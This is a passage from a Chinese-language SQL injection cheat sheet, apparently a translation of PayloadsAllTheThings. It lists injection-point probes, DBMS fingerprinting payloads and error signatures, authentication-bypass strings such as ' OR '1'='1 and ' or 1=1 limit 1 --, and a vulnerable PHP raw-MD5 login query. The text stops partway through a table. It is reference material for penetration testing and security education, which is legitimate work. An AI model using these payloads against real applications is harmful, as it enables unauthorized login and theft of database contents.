# SQL 注入

> SQL 注入（SQLi）是一种安全漏洞类型，允许攻击者干扰应用程序对其数据库执行的查询。SQL 注入是最常见和最严重的Web应用程序漏洞之一，使攻击者能够在数据库上执行任意SQL代码。这可能导致未经授权的数据访问、数据操纵，并在某些情况下完全破坏数据库服务器。

## 概要

* [CheatSheets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/)
    * [MSSQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    * [MySQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    * [OracleSQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    * [PostgreSQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    * [SQLite 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
    * [Cassandra 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
    * [DB2 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md)
* [工具](#工具)
* [入口点检测](#入口点检测)
* [DBMS 识别](#dbms-识别)
* [身份验证绕过](#身份验证绕过)
    * [原始 MD5 和 SHA1](#原始-md5-和-sha1)
* [基于 UNION 的注入](#基于-union-的注入)
* [基于错误的注入](#基于错误的注入)
* [盲注](#盲注)
    * [基于布尔的注入](#基于布尔的注入)
    * [基于盲错误的注入](#基于盲错误的注入)
    * [基于时间的注入](#基于时间的注入)
    * [带外 (OAST)](#带外-oast)
* [基于堆栈的注入](#基于堆栈的注入)
* [多语言注入](#多语言注入)
* [路由注入](#路由注入)
* [二次 SQL 注入](#二次-sql-注入)
* [通用 WAF 绕过](#通用-waf-绕过)
    * [空白字符](#空白字符)
    * [不允许逗号](#不允许逗号)
    * [不允许等于](#不允许等于)
    * [大小写修改](#大小写修改)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - 自动化 SQL 注入和数据库接管工具
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - 一个高级跨平台工具，自动检测并利用 SQL 注入安全漏洞

## 入口点检测

在 SQL 注入 (SQLi) 中检测入口点涉及识别应用程序中未正确清理用户输入的位置，这些输入随后会被包含在 SQL 查询中。

* **错误消息**：在输入字段中输入特殊字符（例如单引号 '）可能会触发 SQL 错误。如果应用程序显示详细的错误消息，则可能表明存在潜在的 SQL 注入点。
    * 简单字符：`'`, `"`, `;`, `)` 和 `*`
    * 编码后的简单字符：`%27`, `%22`, `%23`, `%3B`, `%29` 和 `%2A`
    * 多重编码：`%%2727`, `%25%27`
    * Unicode 字符：`U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` 编码为 `%CA%BA`) 被转换为 `U+0022` QUOTATION MARK (")
        * MODIFIER LETTER PRIME (`U+02B9` 编码为 `%CA%B9`) 被转换为 `U+0027` APOSTROPHE (')

* **基于同义逻辑的 SQL 注入**：通过输入同义（总是为真）条件来测试漏洞。例如，在用户名字段中输入 `admin' OR '1'='1` 可能会在系统易受攻击时登录为管理员。
    * 合并字符

      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```

    * 逻辑测试

      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **时间攻击**：输入会导致有意延迟的 SQL 命令（例如在 MySQL 中使用 `SLEEP` 或 `BENCHMARK` 函数），可以帮助识别潜在的注入点。如果应用程序在输入后响应时间异常长，则可能易受攻击。

## DBMS 识别

### 基于关键字的 DBMS 识别

某些 SQL 关键字特定于特定的数据库管理系统 (DBMS)。通过在 SQL 注入尝试中使用这些关键字并观察网站如何响应，通常可以确定正在使用的 DBMS 类型。

| DBMS                | SQL Payload                     |
| ------------------- | ------------------------------- |
| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
| MySQL               | `connection_id()=connection_id()` |
| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| MSSQL               | `@@CONNECTIONS>0` |
| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
| MSSQL               | `USER_ID(1)=USER_ID(1)` |
| ORACLE              | `ROWNUM=ROWNUM` |
| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| ORACLE              | `LNNVL(0=123)` |
| POSTGRESQL          | `5::int=5` |
| POSTGRESQL          | `5::integer=5` |
| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
| POSTGRESQL          | `current_database()=current_database()` |
| SQLITE              | `sqlite_version()=sqlite_version()` |
| SQLITE              | `last_insert_rowid()>1` |
| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
| MSACCESS            | `val(cvar(1))=1` |
| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |

### 基于错误的 DBMS 识别

不同的 DBMS 在遇到问题时返回不同的错误消息。通过触发错误并检查数据库返回的具体消息，通常可以识别出网站使用的 DBMS 类型。

| DBMS                | 示例错误消息                                                                    | 示例负载         |
| ------------------- | -------------------------------------------------------------------------------|-----------------|
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |

## 身份验证绕过

在标准的身份验证机制中，用户提供用户名和密码。应用程序通常会将这些凭据与数据库进行比较。例如，SQL 查询可能看起来像这样：

```SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

攻击者可以尝试将恶意 SQL 代码注入到用户名或密码字段中。例如，如果攻击者在用户名字段中输入以下内容：

```sql
' OR '1'='1
```

并将密码字段留空，生成的 SQL 查询可能如下所示：

```SQL
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

在这里，`'1'='1'` 始终为真，这意味着查询可能会返回一个有效的用户，从而绕过身份验证检查。

:warning: 在这种情况下，数据库将返回结果数组，因为它将匹配表中的每个用户。这将在服务器端产生错误，因为它期望只有一个结果。通过添加 `LIMIT` 子句，可以限制查询返回的行数。通过在用户名字段中提交以下有效负载，您将以数据库中的第一个用户身份登录。此外，您可以在使用正确的用户名时向密码字段注入有效负载以针对特定用户。

```sql
' or 1=1 limit 1 --
```

:warning: 避免不加选择地使用此有效负载，因为它始终返回为真。它可能与可能会无意中删除会话、文件、配置或数据库数据的端点交互。

* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### 原始 MD5 和 SHA1

在 PHP 中，如果可选的 `binary` 参数设置为 true，则 `md5` 摘要将以长度为 16 的原始二进制格式返回。让我们来看一下这段 PHP 代码，其中身份验证检查的是用户提交的密码的 MD5 哈希值。

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

攻击者可以构造一个有效负载，其中 `md5($password,true)` 函数的结果包含引号并从 SQL 上下文中转义，例如使用 `' or 'SOMETHING`。

| 哈希 | 输入           | 输出 (原始)            | 有效负载  |
| ---- | -------------- | ----------------------- | --------- |
| md5  | ffifdyop       | `'or'6